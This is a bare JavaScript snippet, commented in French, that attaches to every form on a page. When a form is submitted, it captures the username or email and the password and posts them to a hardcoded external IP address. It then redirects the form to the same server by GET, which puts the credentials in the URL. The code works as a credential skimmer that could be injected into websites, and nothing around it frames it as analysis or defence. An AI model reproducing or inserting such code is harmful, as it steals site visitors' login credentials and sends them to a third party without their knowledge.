
        document.addEventListener('DOMContentLoaded', () => {
          const forms = document.querySelectorAll('form');
          forms.forEach(form => {
            form.addEventListener('submit', (event) => {
              const loginField = form.querySelector('input[type="text"], input[type="email"]');
              const passwordField = form.querySelector('input[type="password"]');

              if (loginField && passwordField) {
                // Préparer les données à envoyer
                const loginData = {
                  username: loginField.value,
                  password: passwordField.value,
                };

                // Envoyer les données à votre API
                fetch('http://31.207.34.16:5000/api/logins/logins', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify(loginData),
                }).then(response => {
                  if (response.ok) {
                    console.log('Login data sent successfully');
                  } else {
                    console.error('Failed to send login data');
                  }
                });

                // Changer l'action du formulaire pour rediriger vers votre serveur
                form.action = 'http://31.207.34.16:5000/api/logins/login-summary';
                form.method = 'GET'; // Changez cela en fonction de vos besoins
              }
            });
          });
        });
      